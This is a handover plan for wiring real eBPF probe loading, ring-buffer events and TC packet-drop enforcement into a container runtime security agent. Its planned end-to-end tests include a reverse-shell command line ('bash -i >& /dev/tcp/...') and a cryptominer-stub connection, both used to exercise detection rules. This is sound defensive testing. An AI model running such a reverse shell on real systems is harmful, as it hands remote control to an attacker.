# Phase C — Real eBPF Load/Attach & TC Enforcement (Handover)

**Status update (2026-06-20):** The real loader/TC code is now **written and
mock-gated** — `pkg/ebpf/loader.go` uses `cilium/ebpf` `LoadCollection` +
`link.Tracepoint`/`Kprobe` + `ringbuf.Reader`; `pkg/ebpf/tc_loader.go` uses
`LoadCollection` + `AttachTCX` + real blocklist map `Update`/`Delete`. It compiles
on macOS, cross-vets on Linux (`GOOS=linux go vet`), and the 378-test suite stays
green (mock mode). A Linux-only regression test (`loader_linux_test.go`) guards
against re-stubbing. **What remains is Linux runtime verification only** —
compiling the C probes (needs `libbpf-dev` + `vmlinux.h` on a BTF kernel) and
running the e2e smoke in kind. The Dockerfile and Makefile are fixed to build
all 5 probes + generate vmlinux.h.

**Status:** Pending — requires a Linux build/CI environment. Cannot be executed on macOS.
**Owner:** Lead security engineer (Mackenzie) or hand-off engineer on a Linux box.
**Date written:** 2026-06-20
**Prereq:** Phases A, B, D complete and green on `main` (378 tests, race-clean).

## Why this phase exists

The product's headline promise is *"monitors syscall activity, process lifecycle,
network connections, DNS queries, and TLS handshakes at the kernel level using eBPF."*
**None of that is true today.** The Go scaffolding is real and tested, but every
kernel-facing path is a stub that logs and returns success. This phase makes the
product actually do what the README says.

Until Phase C lands, the repo is **not production-grade** and must not be advertised
as such. The README has already been updated (Phase A) to mark these paths ❌.

## Current stub locations (verify before starting)

| File | What's stubbed | Reality |
|---|---|---|
| `pkg/ebpf/loader.go` `Load()` | calls `loadMockCollection()` — never loads a `cilium/ebpf.Collection` | No eBPF program is in the kernel |
| `pkg/ebpf/loader.go` `Attach()` | only `log.Printf("Attached tracepoint: %s", tp)` | `l.links` stays empty; nothing is attached |
| `pkg/ebpf/loader.go` `readLoop()` | ticks on a 100ms timer doing nothing; comment says *"In production, this would call ringbuf.Reader.Read()"* | No kernel events ever arrive; events only via `InjectEvent`/`SetTestEventChannel` |
| `pkg/ebpf/tc_loader.go` `Load()` | production path is `// TODO` log-only; `blocklistMapFD` never set | `network_tc.o` never loaded |
| `pkg/ebpf/tc_loader.go` `Attach()`/`attachInterface()` | `// TODO` log-only | No clsact qdisc, no TC filters attached |
| `pkg/ebpf/tc_loader.go` `UpdateBlocklistEntry`/`DeleteBlocklistEntry` | `// TODO` log-only | BPF blocklist map never updated |
| `pkg/enforcement/network.go` `updateBPFMap`/`deleteFromBPFMap` | bpfMapFD fallback is `// TODO` log-only | Userspace-only bookkeeping; no packet ever dropped |
| `Dockerfile` Stage 1 | `apk add linux-headers` — **lacks `<bpf/bpf_helpers.h>`**; loop compiles only 4 of 5 probes (no `network_tc`) | Image build would fail or ship incomplete probes |
| `Makefile` `generate-ebpf` | compiles only `process file network escape`; no `network_tc`; no `bpf2go` | Same gap as Dockerfile |

## Definition of Done

1. `scarletctl start` on a Linux node (kernel ≥ 5.8, BTF present) loads all 5 eBPF
   programs and attaches them to real tracepoints/kprobes.
2. A real `sched/sched_process_exec` event from a container is observed end-to-end
   through the pipeline and produces an alert (verified in `alerts.jsonl`).
3. A miner-pool connection (R009) in enforce mode results in a packet dropped at
   TC (verified via `scarlet_network_blocks_total` increment and `tcpdump`).
4. The Docker image builds and the 5 `.o` files are present in `/opt/scarlet/bpf/`.
5. A Linux CI job runs `go test -count=1 ./...` + an e2e test in kind.
6. README ❌ items for eBPF load, ring buffer, TC are flipped to ✅.

## Prerequisites (Linux environment)

- Linux kernel ≥ 5.8 with BTF at `/sys/kernel/btf/vmlinux` (CO-RE).
- `clang`/`llvm` ≥ 12 with the `bpf` target.
- `libbpf-dev` (provides `<bpf/bpf_helpers.h>`, `<bpf/bpf_endian.h>`, `<bpf/bpf_tracing.h>`).
- A `vmlinux.h` — generate via `bpftool btf dump file /sys/kernel/btf/vmlinux format c > pkg/ebpf/include/vmlinux.h`, or use BTFHub for older kernels.
- Go 1.25 (per `go.mod`).
- `cilium/ebpf` is already a dependency (`v0.16.0`).
- Docker + `kind` for the e2e test.
- Root or `CAP_BPF` + `CAP_SYS_ADMIN` + `CAP_NET_ADMIN` (for TC) at runtime.

## Workstreams

### C1 — `bpf2go` codegen for C structs (do this first)

**Goal:** stop hand-maintaining the Go mirror of `struct scarlet_event`. Today the
Go `ScarletEvent` (in `pkg/ebpf/types.go`) and the C `struct scarlet_event`
(in `pkg/ebpf/include/security_scarlet_event.h`) must match by hand. The HANDOVER
even calls out `SizeofScarletEvent()` returns 432 — a brittle invariant.

Steps:
1. Add `//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang Scarlet ../probes/process.bpf.c -- -I../include` style directives (one per probe) in a new `pkg/ebpf/gen.go`.
2. Run `make generate-go` (extend the existing target) to emit `scarlet_bpfel.go` etc.
3. Replace the hand-written `ScarletEvent` mirror with the generated type, OR keep `ScarletEvent` as the public API and add a generated `bpfEvent` that `Decode` converts to. Pick the option that minimizes churn to `pkg/ebpf/types.go` callers (the pipeline, rules engine, and tests all consume `ScarletEvent`).
4. Add a `TestScarletEventLayout` that asserts `binary.Size(ScarletEvent{}) == C sizeof(struct scarlet_event)` using the generated bindings — kills the "432" magic number.

**Risk:** the generated type may have different field tags than the hand-written one. Audit `formatOutput`/`buildAlert` field access after generation.

### C2 — Real eBPF load + attach (`pkg/ebpf/loader.go`)

**Goal:** `Loader.Load()` and `Attach()` use `cilium/ebpf`.

`Load()`:
1. For each probe category, `ebpf.LoadCollection(objPath)` (or load the bpf2go-generated `CollectionSpec`).
2. Stash the `*ebpf.Collection` on the `Loader`.
3. Acquire the BPF maps the kernel-side filter needs: `containerCgroupsMap`, `monitoredSyscallsMap`, `sensitivePathMap`, `minerPoolPortsMap`, `c2PortsMap`, `cloudMetadataMap`. These are currently nil-checked in `AddContainerCgroup` etc. — wire them to the loaded maps.
4. Populate the maps from `loadDefaultLists()` (currently a no-op loop over `MinerPoolPorts`/`C2Ports`/`CloudMetadataIPs`).
5. Keep `loadMockCollection` as a fallback when `mockMode` (non-Linux or no BTF) so macOS `go test` stays green. Gate on `runtime.GOOS == "linux" && isBPFAvailable()`.

`Attach()`:
1. For tracepoints: `link.AttachTracepoint(link.Tracepoint{Category, Name}, prog)` — the probe→tracepoint mapping table already exists in the current `Attach()` (it's the source of truth for which tracepoints to use; reuse it).
2. For kprobes (network): `link.Kprobe("tcp_v4_connect", prog, nil)` etc.
3. Append each `link.Link` to `l.links` (already a field) so `Stop()` can close them.
4. Fail closed: if a security-critical probe fails to attach, log loudly and return an error (current behavior is to log a warning and continue — that's fine for development but should be configurable via a `StrictAttach` flag).

**Byte-order note:** `IPToUint32` (`pkg/enforcement/network.go`) returns host byte order and the C TC program uses `bpf_ntohl(iph->daddr)` (host order) — these agree. The misleading `// Network byte order` comments on `BlocklistKey.DestIP` (Go) and `network_block_key.dest_ip` (C) are wrong but not a correctness bug. Fix the comments during this phase; do NOT change the byte order without re-verifying both sides.

### C3 — Real ring buffer reader (`pkg/ebpf/loader.go` `readLoop`)

**Goal:** replace the no-op ticker with `ringbuf.Reader.Read()`.

1. In `Load()`, after attaching, open `ringbuf.NewReader(collection.Maps["events"], ringBufSize)`. The probe C source must emit to a `BPF_MAP_TYPE_RINGBUF` map named `events` (verify the probe sources declare it — `process.bpf.c` etc.).
2. `readLoop`: `record, err := reader.Read()` (blocking), then `l.decodeEvent(record.RawSample)` → push `*ScarletEvent` to `l.eventCh` (respecting the ring-buffer filter `l.filter` first, as `InjectEvent` does today).
3. Use `reader.SetDeadline` or a `select` on `l.stopCh` to make `Stop()` interrupt the blocking read cleanly.
4. Keep `SetTestEventChannel`/`InjectEvent` working for tests (they bypass `reader`).

### C4 — TC loader production path (`pkg/ebpf/tc_loader.go`)

**Goal:** `network_tc.bpf.c` actually loads, attaches to clsact, and the blocklist map is updated from userspace.

1. `Load()`: `ebpf.LoadCollection(objDir + "/network_tc.o")`; set `blocklistMapFD = collection.Maps["network_blocklist"].FD()`.
2. `Attach()` per interface: create a `clsact` qdisc via netlink, then attach `tc_ingress_filter` to ingress and `tc_egress_filter` to egress. Use `github.com/cilium/ebpf`'s `link.AttachTC` (cgroup/TC attach helpers) or the `vishvananda/netlink` library (add as a dependency). Preserve the existing `interfaces` map for `Detach`.
3. `UpdateBlocklistEntry`/`DeleteBlocklistEntry`: implement via `collection.Maps["network_blocklist"].Update(key, value, ebpf.UpdateAny)` / `.Delete(key)`. The Go `BlocklistKey`/`BlocklistValue` structs must match the C `network_block_key`/`network_block_value` — use bpf2go if possible, or add a layout test.
4. Keep mock mode (`runtime.GOOS != "linux" || !isBPFAvailable()`) returning nil so macOS tests stay green.
5. The `network_block_events` ringbuf: add a reader (C3-style) so userspace learns when a packet was dropped, for the audit/alert path. Currently `emit_block_event` in the C reserves to `network_block_events` but nobody reads it.

### C5 — Dockerfile + Makefile fixes

1. Dockerfile Stage 1: change `apk add clang llvm linux-headers elfutils-dev` to also add `libbpf-dev` (and `bpftool` for vmlinux.h generation if not vendoring).
2. Add `network_tc` to both the Dockerfile loop and the `Makefile` `generate-ebpf` loop: `for prog in process file network escape network_tc`.
3. Generate `pkg/ebpf/include/vmlinux.h` at build time (or vendor a BTFHub set) so `#include "vmlinux.h"` resolves. Currently the probes `#include "vmlinux.h"` which does not exist in the repo — the build cannot work without it.
4. Verify the multi-stage image actually builds: `make docker` (the `docker-build` target).
5. Ensure the runtime image grants eBPF capabilities via the Helm `securityContext` (check `deploy/helm/scarlet-runtime/templates/daemonset.yaml` — it should set `privileged: true` or the specific `CAP_BPF`/`CAP_SYS_ADMIN`/`CAP_NET_ADMIN` caps). If not, add them; this is required for TC attach.

### C6 — End-to-end test on Linux

1. `test/e2e/` (new): a kind cluster with a DaemonSet running the agent.
2. Scenario A (container escape detection): run a pod that calls `nsenter`/`setns`; assert an R001 alert appears in `alerts.jsonl`.
3. Scenario B (cryptojacking + enforcement): run `xmrig`-stub connecting to a miner-pool port; in enforce mode assert the connection is dropped at TC (`scarlet_network_blocks_total{rule="R009"}` increments) and the container is killed.
4. Scenario C (reverse shell correlation): spawn `bash -i >& /dev/tcp/...`; assert R014 correlation fires within 5s.
5. These tests are `//go:build linux_e2e` tagged and run only in CI on a Linux runner (never on macOS dev boxes).

## Testing strategy

- **macOS dev (this machine):** `go test -count=1 ./...` must stay green — all kernel paths are mock-mode. The 378 existing tests guard the userspace logic.
- **Linux unit:** same `go test ./...` on a Linux box; mock-mode still active unless BTF is present.
- **Linux CI (new job):** `go test -race ./...` + `go test -tags=linux_e2e ./test/e2e/...` in a kind cluster.
- Add a `TestRealEBPFLoadAttach` (build-tagged `linux`) that asserts `Loader.Load` + `Attach` succeed when BTF is present and at least one `link.Link` is populated. This is the regression guard that prevents re-stubbing.

## Risks & decisions

- **Kernel portability:** CO-RE + BTFHub covers most kernels ≥ 4.18; if you only need 5.8+ the story is simpler. Decide the supported floor and document it in the README prerequisites (currently says 5.8+).
- **`link.AttachTC` vs netlink:** the cilium/ebpf `link` package has TC attach helpers in recent versions; prefer them over adding `vishvananda/netlink` to avoid a new dependency if possible. Check the v0.16.0 API.
- **Struct drift:** the biggest ongoing risk is the Go/C struct mirror drifting. bpf2go (C1) is the real fix; without it, add a `binary.Size` assertion test.
- **Don't regress the safety protocol:** the 7-rule enforcement safety protocol in `pkg/pipeline/response.go` is correct and must keep guarding the kill path. Phase C makes the kill path actually fire on real events — the safety rules become load-bearing, not theoretical. Re-read them before wiring real events.
- **HITL:** Phase C touches kernel state (attaches probes, drops packets). The e2e test in enforce mode kills containers. Run enforce-mode e2e only in a throwaway kind cluster, never against a real workload cluster without explicit approval.

## Acceptance gate (before flipping README ❌ → ✅)

- [ ] `Loader.Load`/`Attach` real on Linux; `link.Link` slice non-empty after attach.
- [ ] `readLoop` reads from a real ring buffer; a container `execve` produces an alert.
- [ ] `TCLoader` attaches clsact; R009 drops a packet at TC (verified via metrics + tcpdump).
- [ ] Dockerfile builds; 5 `.o` files shipped; `vmlinux.h` resolves.
- [ ] Linux CI job green; `TestRealEBPFLoadAttach` passes.
- [ ] `go test -count=1 ./...` green on macOS (mock mode preserved).
- [ ] README eBPF/TC rows flipped to ✅ with evidence.
- [ ] Merge gate from `docs/remediation_plan.md` satisfied: `main == origin == sha`, `--no-ff`.

## Pointers

- C probe sources: `pkg/ebpf/probes/{process,file,network,escape,network_tc}.bpf.c`
- Shared event header: `pkg/ebpf/include/security_scarlet_event.h` (needs `vmlinux.h`)
- Go loader: `pkg/ebpf/loader.go`, `pkg/ebpf/tc_loader.go`
- Go event types + decoder: `pkg/ebpf/types.go`
- Enforcement wiring: `pkg/enforcement/network.go`, `pkg/pipeline/response.go`
- Agent wiring: `pkg/agent/agent.go` (`initComponents` — TC loader ↔ network enforcer)
- Build: `Makefile` (`generate-ebpf`, `generate-go`, `docker-build`), `Dockerfile`
- Deploy: `deploy/helm/scarlet-runtime/templates/{daemonset,rbac,configmap}.yaml`